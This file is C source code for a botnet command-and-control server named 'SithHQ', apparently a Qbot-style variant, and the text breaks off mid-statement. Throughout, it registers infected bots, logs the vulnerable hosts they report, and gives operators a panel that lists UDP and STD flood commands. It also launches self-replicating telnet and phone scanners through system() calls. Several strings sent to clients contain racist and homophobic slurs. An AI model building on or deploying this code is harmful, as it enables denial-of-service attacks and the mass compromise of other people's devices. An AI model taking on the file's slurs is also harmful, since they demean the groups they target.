/*
          _______. __  .___________. __    __      __    __    ______      
         /       ||  | |           ||  |  |  |    |  |  |  |  /  __  \     
        |   (----`|  | `---|  |----`|  |__|  |    |  |__|  | |  |  |  |    
         \   \    |  |     |  |     |   __   |    |   __   | |  |  |  |    
     .----)   |   |  |     |  |     |  |  |  |    |  |  |  | |  `--'  '--. 
     |_______/    |__|     |__|     |__|  |__|    |__|  |__|  \_____\_____\
                                                                      
                ~{SithHQ}~
				
server side by: KittyHaxz & Qboting

Make Sure Make a (sith.txt) for your logins

Here's a Few Color Codes If you Would Like To Change The Color 

Blue = '\x1b[0;34m'
Brown = '\x1b[0;33m'
Cyan = '\x1b[0;36m' 
DarkGray = '\x1b[1;30m' 
Green = '\x1b[0;32m' 
LightBlue = '\x1b[1;34m' 
LightCyan = '\x1b[1;36m' 
LightGray = '\x1b[0;37m' 
LightGreen = '\x1b[1;32m' 
LightPurple = '\x1b[1;35m' 
LightRed = '\x1b[1;31m' 
Normal = '\x1b[0m' 
Purple = '\x1b[0;35m' 
Red = '\x1b[0;31m' 
White = '\x1b[1;37m' 
Yellow = '\x1b[1;33m

*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>

#define MAXFDS 1000000

struct account {
    char id[20]; 
    char password[20];
};
static struct account accounts[50]; //max users is set on 50 you can edit that to whatever 
struct clientdata_t {
        uint32_t ip;
        char build[7];
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
        int connected;
} managements[MAXFDS];
////////////////////////////////////
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
////////////////////////////////////
int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}
void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}
static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "This is a fucking retarted reboot your server\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[35m", 5, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                //printf("sent to fd: %d\n", i);
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[32m~> \x1b[35m", 13, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *epollEventLoop(void *useless)
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len);
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;
                                           //WE ARE MAKING SURE THERE IS NO DUP CLIENTS
                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }
 
                                        if(dup) 
                                        {                  //WE ARE MAKE SURE AGAIN HERE BY SENDING !* LOLNOGTFO|!* GTFOFAG
									            if(send(infd, "!* GTFONIGGER\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
											    if(send(infd, "!* GTFOFAG\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
												if(send(infd, "!* GTFODUP\n\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
												if(send(infd, "!* DUPES\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
												if(send(infd, "!* GTFOPUSSY\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
												if(send(infd, "!* LOLNOGTFO\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                close(infd);
                                                continue;
                                        }
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        clients[infd].connected = 1;
                                        send(infd, "!* PHONE ON\n", 14, MSG_NOSIGNAL);
										send(infd, "!* FATCOCK\n", 11, MSG_NOSIGNAL);
										
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
                                                if(strcmp(buf, "PING") == 0) // basic IRC-like ping/pong challenge/response to see if server is alive
                                                {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                        continue;
                                                }
                                                if(strstr(buf, "REPORT ") == buf) // received a report of a vulnerable system from a scan
                                                {
                                                        char *line = strstr(buf, "REPORT ") + 7; 
                                                        fprintf(telFD, "%s\n", line); // let's write it out to disk without checking what it is!
                                                        fflush(telFD);
                                                        //TELFound++;
                                                        continue;
                                                }
                                                if(strstr(buf, "PROBING") == buf)
                                                {
                                                        char *line = strstr(buf, "PROBING");
                                                        //scannerreport = 1;
                                                        continue;
                                                }
                                                if(strstr(buf, "REMOVING PROBE") == buf)
                                                {
                                                        char *line = strstr(buf, "REMOVING PROBE");
                                                        //scannerreport = 0;
                                                        continue;
                                                }
                                                if(strcmp(buf, "PONG") == 0)
                                                {
                                                        continue;
                                                }
 
                                                printf("buf: \"%s\"\n", buf);
                                        }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        close(thefd);
}}}}}
unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}
void *titleWriter(void *sock) 
{
        int thefd = (int)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
		sprintf(string, "%c]0; [+] Ewok Slaves: %d [+] Storm Troopers Online: %d [-]%c", '\033', clientsConnected(), managesConnected, '\007');
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
 
                sleep(3);
        }
}
int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("sith.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}
 
void *telnetWorker(void *sock)
{
		char usernamez[80];
        int thefd = (int)sock;
		int find_line;
        managesConnected++;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
        char* nickstring;
        char* username;
        char* password;
        memset(buf, 0, sizeof buf);
        char botnet[2048];
        memset(botnet, 0, 2048);
    
        FILE *fp;
        int i=0;
        int c;
        fp=fopen("sith.txt", "r"); 
        while(!feof(fp)) 
		{
				c=fgetc(fp);
				++i;
        }
        int j=0;
        rewind(fp);
        while(j!=i-1) 
		{
			fscanf(fp, "%s %s", accounts[j].id, accounts[j].password);
			++j;
        }
        
        if(send(thefd, "\x1b[35mTrooper ID: \x1b[33m", 23, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
		sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File(nickstring);
        if(strcmp(nickstring, accounts[find_line].id) == 0){	
       	if(send(thefd, "\x1b[35m*           VALID CREDENTIALS          *\r\n", 49, MSG_NOSIGNAL) == -1) goto end;	
        if(send(thefd, "\x1b[35mPassword: \x1b[36m", 23, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto fak;
        }
        failed:
        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[35m***********************************\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[32m*  Unidentified... Target Locked  *\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[35m***********************************\r\n", 43, MSG_NOSIGNAL) == -1) goto end;
		    sleep(5);
        goto end;
        fak:
		
		pthread_create(&title, NULL, &titleWriter, sock);
		char line1 [80];
		char line2 [80];
		char line3 [80];
		char line4 [80];
		char line5 [80];
		char line6 [80];
		char line7 [80];
        char line8 [80];
		char line9 [80];
		char ascii_banner_line1 [5000];
		char ascii_banner_line9 [5000];
		char ascii_banner_line10 [5000];
		char ascii_banner_line11 [5000];
		char ascii_banner_line12 [5000];
		char ascii_banner_line13 [5000];
		char ascii_banner_line14 [5000];
		char dup1 [5000];
		char dup2 [5000];
		char dup3 [5000];
		char dup4 [5000];
		char dup5 [5000];
		char dup6 [5000];
		char dup7 [5000];
		char dup8 [5000];

    
        sprintf(line1, "\x1b[0;35m     _______. __  .___________. __    __      __    __    ______      \r\n");
		sprintf(line2, "\x1b[0;35m    /       ||  | |           ||  |  |  |    |  |  |  |  /  __  \     \r\n");
		sprintf(line3, "\x1b[0;31m   |   (----`|  | `---|  |----`|  |__|  |    |  |__|  | |  |  |  |    \r\n");
		sprintf(line4, "\x1b[0;31m      \   \    |  |     |  |     |   __   |    |   __   | |  |  |  |  \r\n");
		sprintf(line5, "\x1b[0;31m.----)   |   |  |     |  |     |  |  |  |    |  |  |  | |  `--'  '--. \r\n");
		sprintf(line6, "\x1b[0;35m|_______/    |__|     |__|     |__|  |__|    |__|  |__|  \_____\_____\ \r\n");
		sprintf(line7, "\x1b[0;31m                                                                      \r\n");
        sprintf(line8, "\r\n\x1b[0;35m    Welcome %s To The Dark Side\x1b[0;31m Access Level Admiral\r\n", accounts[find_line].id, buf);
		sprintf(line9, "\x1b[0;31m                                                                      \r\n");
		
		sprintf(ascii_banner_line1,  "\x1b[32m [+] Setting Shit up\r\n");
		sprintf(ascii_banner_line9, "\x1b[31m    [-]  Succesfully hijacked connection + [SithHQ]\r\n");
		sprintf(ascii_banner_line10, "\x1b[35m    [-]  Masking connection from utmp+wtmp + [SithHQ]\r\n");
		sprintf(ascii_banner_line11, "\x1b[36m    [-]  Hiding from netstat + [SithHQ]\r\n");
		sprintf(ascii_banner_line12, "\x1b[31m    [-]  Removing all traces of Bins + [SithHQ]\r\n");
		sprintf(ascii_banner_line13, "\x1b[33m    [-]  Echo Loading bots back to the net + [SithHQ]\r\n");
		sprintf(ascii_banner_line14, "\x1b[36m [+] Finished, Entering The DarkSide, Prepair Yourself!\r\n");
		char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\033[2J\033[1;1H");
		if(send(thefd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		if(send(thefd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		if(send(thefd, ascii_banner_line10, strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		if(send(thefd, ascii_banner_line11, strlen(ascii_banner_line11), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		if(send(thefd, ascii_banner_line12, strlen(ascii_banner_line12), MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		if(send(thefd, ascii_banner_line13, strlen(ascii_banner_line13), MSG_NOSIGNAL) == -1) goto end;

		if(send(thefd, ascii_banner_line14, strlen(ascii_banner_line14), MSG_NOSIGNAL) == -1) goto end;
		
		sleep(4);
		memset(clearscreen, 0, 2048);
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line1, strlen(line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line2, strlen(line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line3, strlen(line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line4, strlen(line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line5, strlen(line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line6, strlen(line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line7, strlen(line7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, line8, strlen(line8), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line9, strlen(line9), MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		if(send(thefd, "\x1b[0;31m~> \x1b[0;31m", 13, MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
		
        while(fdgets(buf, sizeof buf, thefd) > 0)
        {
			
	    if(strstr(buf, "BOTS"))
		{  
		sprintf(botnet, "[+] Bots Online: %d [-] Users Online: %d [+]\r\n", clientsConnected(), managesConnected);
	    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
	 
	    if(strstr(buf, "SHOW"))
		{  
        sprintf(botnet, "[+] Bots Online: %d [-] Users Online: %d [+]\r\n", clientsConnected(), managesConnected);
	    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	   }
		
        if(strstr(buf, "bots"))
		{  
	    sprintf(botnet, "[+] Bots Online: %d [-] Users Online: %d [+]\r\n", clientsConnected(), managesConnected);
	    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
	    if(strstr(buf, "TIME"))
		{  
    	sprintf(botnet, "why would anyone even type time like tf\r\n");
	    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
			}
		if(strstr(buf, "LOAD ON")) {
		system("python scan.py 500 LUCKY2 1 3");
		if(send(thefd, "\x1b[31m~> \x1b[35m", 11, MSG_NOSIGNAL) == -1) goto end;
		continue;
			}
		if(strstr(buf, "PYTHON OFF")) {
    	system("killall -9 python");
		continue;
			}
		if(strstr(buf, "!* wget.py")) {
		system("python wget.py sithbots.txt");
		if(send(thefd, "\x1b[36m~> \x1b[32m", 11, MSG_NOSIGNAL) == -1) goto end;
     	continue;
			}
	    if(strstr(buf, "RULES"))
		{  
		sprintf(botnet, "No rules have fun\r\n");
	    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
	
	    if(strstr(buf, "PORTS"))
		{  
		sprintf(botnet, "Xbox 3074 psn 443 NFO 1094 Hotspot whatever port nigga use lanc or commview\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
	    if(strstr(buf, "!* PHONE ON OFF"))
		{  
		sprintf(botnet, "PHONE SELF REPLIFICATION OFF\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* TCP"))
		{  
		sprintf(botnet, "STOP USING TCP DUMB NIGGER\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* UDP"))
		{  
		sprintf(botnet, "WOOPS NIGGA OFFLINE NOW\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* STD"))
		{  
		sprintf(botnet, "Succesfully Infected skid with STDs\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* CNC"))
		{  
		sprintf(botnet, "Succesfully Fucked Their BOTNET\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* HTTPFLOOD"))
		{  
		sprintf(botnet, "STOP HITTING WEBSITED UNLESS YOURE DSTATING\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* HTTP"))
		{  
		sprintf(botnet, "STOP HITTING WEBSITES UNLESS YOURE DSTATING\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
	    if(strstr(buf, "!* PHONE ON ON"))
		{  
		sprintf(botnet, "PHONE SELFREPLIFICATION OFF\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
	    if(strstr(buf, "ports"))
		{  
		sprintf(botnet, "Xbox 3074 psn 443 NFO 1094 Hotspot whatever port nigga use lanc or commview\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
			if(strstr(buf, "HELP")) {
				pthread_create(&title, NULL, &titleWriter, sock);
				char helpline1  [80];
				char helpline2  [80];
				char helpline3  [80];
				char helpline4  [80];
				char helpline5  [80];

				sprintf(helpline1,  "\x1b[0;31mType An Option:\r\n");
				sprintf(helpline2,  "\x1b[1;37m[\x1b[35mDDOS\x1b[1;37m] ~ Shows which ports to use while attacking\r\n");
				sprintf(helpline3,  "\x1b[1;37m[\x1b[34mEXTRA\x1b[1;37m] ~ Shows a list of all extra commands\r\n");
				sprintf(helpline5,  "\x1b[1;37m[\x1b[0;33mSELF REP\x1b[1;37m] ~ Only use if Admin Permission\r\n");;

				if(send(thefd, helpline1,  strlen(helpline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, helpline2,  strlen(helpline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, helpline3,  strlen(helpline3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, helpline4,  strlen(helpline4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, helpline5,  strlen(helpline5),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				while(1) {
				if(send(thefd, "\x1b[1;31m~$ \x1b[1;36m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
		}
					if(strstr(buf, "DDOS")) {
				pthread_create(&title, NULL, &titleWriter, sock);
				char ddosline1  [80];
				char ddosline2  [80];
				char ddosline3  [80];

				sprintf(ddosline1, "\x1b[31m\x1b[35m !* UDP [IP] [PORT] [TIME] 32 1024 10 | UDP FLOOD\r\n");
				sprintf(ddosline2, "\x1b[31m\x1b[31m !* STD [IP] [PORT] [TIME] | STD FLOOD\r\n");
				sprintf(ddosline3, "\x1b[31m\x1b[35m !* KILLATTK | KILLS ALL ATTACKS\r\n");

				if(send(thefd, ddosline1,  strlen(ddosline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline2,  strlen(ddosline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline3,  strlen(ddosline3),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				while(1) {
				if(send(thefd, "\x1b[1;31m~$ \x1b[1;36m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "SELF REP")) {
				pthread_create(&title, NULL, &titleWriter, sock);
				char repline1  [80];
				char repline2  [80];
				char repline3  [80];
				char repline4  [80];
				
				sprintf(repline1,  "\x1b[31m !* PHONE ON | TURNS ON PHONE SELFREPLIFICATION\r\n");
				sprintf(repline2,  "\x1b[35m !* SCANNER ON | TURNS ON TELNET SELFREPLIFICATION\r\n");
				sprintf(repline3,  "\x1b[31m !* wget.py | SCANS sithbots.txt PYTHON LIST\r\n");
				sprintf(repline4,  "\x1b[35m !* PYTHON OFF | TURNS OFF PYTHON SCANNER\r\n");

				if(send(thefd, repline1,  strlen(repline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, repline2,  strlen(repline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, repline3,  strlen(repline3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, repline4,  strlen(repline4),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				while(1) {
				if(send(thefd, "\x1b[1;31m~$ \x1b[1;36m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
			if(strstr(buf, "EXTRA")) {
				pthread_create(&title, NULL, &titleWriter, sock);
				char extraline1  [80];
				char extraline2  [80];
				char extraline3  [80];

				sprintf(extraline1,  "\x1b[35m PORTS | PORTS TO HIT WITH DUH\r\n");
				sprintf(extraline2,  "\x1b[31m BOTS | BOT COUNT DUH\r\n");
				sprintf(extraline3,  "\x1b[35m CLEAR | CLEARS SCREEN DUH\r\n");

				if(send(thefd, extraline1,  strlen(extraline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, extraline2,  strlen(extraline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, extraline3,  strlen(extraline3),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				while(1) {
				if(send(thefd, "\x1b[1;31m~$ \x1b[1;36m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
	    if(strstr(buf, "CLEAR")){

        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line1, strlen(line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line2, strlen(line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line3, strlen(line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line4, strlen(line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line5, strlen(line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line6, strlen(line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line7, strlen(line7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, line8, strlen(line8), MSG_NOSIGNAL) == -1) goto end;
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
     	}
	    if(strstr(buf, "clear")){
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line1, strlen(line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line2, strlen(line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line3, strlen(line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line4, strlen(line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line5, strlen(line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line6, strlen(line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line7, strlen(line7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, line8,  strlen(line8), MSG_NOSIGNAL) == -1) goto end;
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
		}
        if(strstr(buf, "LOGOUT")) 
	    {  
 		  sprintf(botnet, "Peace Mr %s\r\n", accounts[find_line].id, buf);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  goto end;
		} // if someone tries to send a attack above 200O SEC it will kick them off  :)
		if(strstr(buf, "99999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
     	if(strstr(buf, "99999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
		if(strstr(buf, "99999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
		if(strstr(buf, "99999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
	    if(strstr(buf, "99999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
     	if(strstr(buf, "99999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
		if(strstr(buf, "99999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
		if(strstr(buf, "99999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
      	if(strstr(buf, "999999")) 
		{  
